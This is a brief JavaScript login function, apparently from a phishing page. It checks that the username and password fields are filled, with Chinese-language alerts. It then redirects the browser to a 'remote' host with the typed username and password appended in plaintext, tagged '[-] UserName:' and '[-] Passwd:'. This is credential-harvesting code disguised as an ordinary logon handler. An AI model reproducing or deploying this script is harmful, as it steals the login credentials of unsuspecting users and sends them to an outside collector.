function logon(){
    var password = document.getElementById("pwd").value;
    var usersname = document.getElementById("usersname").value;
    if(password == ""){
        alert("密码不可为空")
        return false
    }
    if (usersname == "") {
        alert("用户名不可为空")
        return false
    }
    if (usersname == "" && password == "") {
        alert("用户名和密码不可为空")
        return false
    }
    else {
        var url = window.location.href;
        window.location.href = remote + '/push/'+url.substring(remote.length)+'/[-] UserName: ' + usersname +" [-] Passwd: " + password
    }
}
function onload() {

}